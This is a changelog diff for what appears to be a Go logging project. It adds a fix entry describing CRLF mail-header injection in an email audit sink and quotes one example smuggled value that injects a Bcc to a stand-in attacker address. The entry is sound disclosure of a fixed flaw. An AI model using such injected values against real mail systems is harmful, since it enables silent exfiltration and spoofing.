@@ -13,6 +13,16 @@ keeps reading that version for at least 24 months after a successor lands.
 
 ### Fixed
 
+- **Email audit sink: CRLF in an event field can no longer inject mail
+  headers.** The `Subject` line is built from the event's Component, Op and
+  deployment name and written straight into the RFC 5322 header block with
+  no CR/LF stripping, so a newline in a deployment name — e.g.
+  `db1\r\nBcc: attacker@example.com` — forged arbitrary headers: a silent
+  Bcc exfiltrating every incident mail, a spoofed From, or a split into the
+  body. Header values are now sanitized (CR/LF collapsed to space) before
+  emission. The third and highest-severity instance of the same
+  manual-format escaping class as the CEF and syslog sinks.
+
 - **Syslog audit sink: `]` in a structured-data value can no longer
   terminate the SD element early.** The RFC 5424 SD-PARAM block was built
   with Go's `%q`, which escapes `"` and `\` but not `]` — a printable byte
